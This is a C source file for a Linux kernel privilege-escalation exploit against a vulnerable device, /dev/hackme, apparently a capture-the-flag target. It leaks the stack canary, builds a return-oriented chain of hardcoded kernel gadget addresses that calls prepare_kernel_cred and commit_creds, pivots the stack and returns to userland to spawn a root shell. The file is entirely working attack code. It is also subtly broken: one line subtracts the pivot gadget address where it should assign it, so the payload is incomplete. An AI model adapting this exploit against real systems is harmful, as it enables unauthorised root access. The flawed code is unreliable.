#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>

int global_fd;

void open_dev() {
    global_fd = open("/dev/hackme", O_RDWR);
    if (global_fd < 0) {
        puts("[!] Failed to open device");
        exit(-1);
    }
    puts("[*] Opened device");
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    __asm__(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
           );
    puts("[*] Saved state");
}

unsigned long cookie;

void leak(void) {
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];

    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
}

void get_shell(void) {
    puts("[*] Returned to userland");
    if (getuid() == 0) {
        printf("[*] UID: %d, got root\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell;

unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long pop_rdx = 0xffffffff81007616;
unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4;
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3;
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;
unsigned long iretq = 0xffffffff8100c0d9;
unsigned long mov_esp_pop2_ret = 0xffffffff8196f56a;

unsigned long *fake_stack;

void build_fake_stack(void) {
    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned off = 0x1000/8;
    fake_stack[0] = 0xdead;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = 0x0;
    
    fake_stack[off++] = pop_rdi_ret;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = prepare_kernel_cred;

    fake_stack[off++] = pop_rdx;
    fake_stack[off++] = 0x8;

    fake_stack[off++] = cmp_rdx_jne_pop2_ret;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = 0x0;

    fake_stack[off++] = mov_rdi_rax_jne_pop2_ret;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = 0x0;

    fake_stack[off++] = commit_creds;
    fake_stack[off++] = swapgs_pop1_ret;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = iretq;
    fake_stack[off++] = user_rip;
    fake_stack[off++] = user_cs;
    fake_stack[off++] = user_rflags;
    fake_stack[off++] = user_sp;
    fake_stack[off++] = user_ss;

}

void overflow(void) {
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;

    payload[off++] = cookie;

    puts("[*] Inserting cookie");

    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] - mov_esp_pop2_ret;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never have been reached");
}

int main() {
    
    save_state();

    open_dev();

    leak();

    build_fake_stack();

    overflow();

    puts("[!] Should never be reached");

    return 0;
}
